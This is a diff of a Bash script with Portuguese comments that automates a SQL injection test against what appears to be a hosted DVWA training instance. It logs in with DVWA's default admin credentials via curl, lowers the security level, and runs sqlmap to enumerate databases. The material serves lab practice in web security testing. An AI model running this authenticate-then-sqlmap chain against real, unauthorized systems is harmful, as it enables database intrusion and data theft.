@@ -1,29 +1,41 @@
 #!/bin/bash
 
 # Play 03 — SQLMap DVWA em produção
-# Usa a variável DVWA_HOST (ou valor default) para definir o host alvo
+# Autentica no DVWA e roda sqlmap corretamente
 
-# Definição do host DVWA (sem porta)
+# Define host DVWA (sem porta)
 TARGET_HOST="${DVWA_HOST:-web-dvwa-production.up.railway.app}"
 
-echo "[*] Iniciando análise SQL Injection com sqlmap contra $TARGET_HOST..."
-
-# Diretório do script para referência de arquivos, se necessário
+# Diretório do script para referência
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
-# URL alvo completo
-TARGET_URL="http://${TARGET_HOST}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
+# Cookie file para manter sessão autenticada
+COOKIE_FILE="$SCRIPT_DIR/cookies.txt"
 
-# Cookie para nível de segurança baixo e sessão de teste
-COOKIE="security=low; PHPSESSID=test"
+# URLs de login e security
+LOGIN_URL="http://$TARGET_HOST/login.php"
+SECURITY_URL="http://$TARGET_HOST/security.php?security=low"
+INJECTION_URL="http://$TARGET_HOST/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
 
-# Execução do SQLMap em modo não interativo
+# 1. Autentica no DVWA como admin/password
+echo "[*] Autenticando no DVWA em $LOGIN_URL..."
+curl -s -c "$COOKIE_FILE" \
+  -d "username=admin&password=password&Login=Login" \
+  "$LOGIN_URL" > /dev/null
+
+# 2. Define nível de segurança para low
+echo "[*] Definindo segurança para LOW..."
+curl -s -b "$COOKIE_FILE" "$SECURITY_URL" > /dev/null
+
+# 3. Inicia análise SQL Injection
+echo "[*] Iniciando análise SQL Injection com sqlmap contra $INJECTION_URL..."
 sqlmap \
-  -u "$TARGET_URL" \
-  --cookie="$COOKIE" \
+  -u "$INJECTION_URL" \
+  --cookie-file="$COOKIE_FILE" \
   --batch \
   --level=3 \
   --risk=2 \
   --dbs
 
+# Finaliza
 echo "[✓] Análise SQLi concluída."
